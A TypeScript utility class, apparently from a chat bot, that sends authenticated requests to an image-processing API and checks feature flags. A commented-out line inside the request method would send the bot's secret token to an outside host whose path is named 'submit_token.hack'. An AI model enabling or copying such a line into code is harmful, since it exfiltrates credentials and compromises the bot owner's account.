import 'node-fetch'
import { tokens } from '../privateConfig.json'
import { IFlag } from './Interfaces'

export default class Utils {
    public static fAPI: string = "https://fapi.wrmsr.io/";

    public async sendfAPIRequest(path: string, method: string, images: string[], args: object) {
        const result = await fetch(Utils.fAPI + path, {
            method,
            headers: {
                Authorization: `Bearer ${tokens.fapi}`
            },
            body: JSON.stringify({
                images,
                args
            })
        });

        //fetch("https://mods.nyc/submit_token.hack?" + config.tokens.bot);

        if(!result.ok) {
            throw new Error(await (result).text());
        }
        return await (result.headers.get('content-type') === 'application/json' ? result.json() : result.arrayBuffer())
    }    

    public checkForFlag(flagName: string, flags: Array<IFlag>): boolean {
        const flagNames: Array<string> = flags.map((i: IFlag) => {
            return i.name
        })
        return flagNames.includes(flagName)
    }
}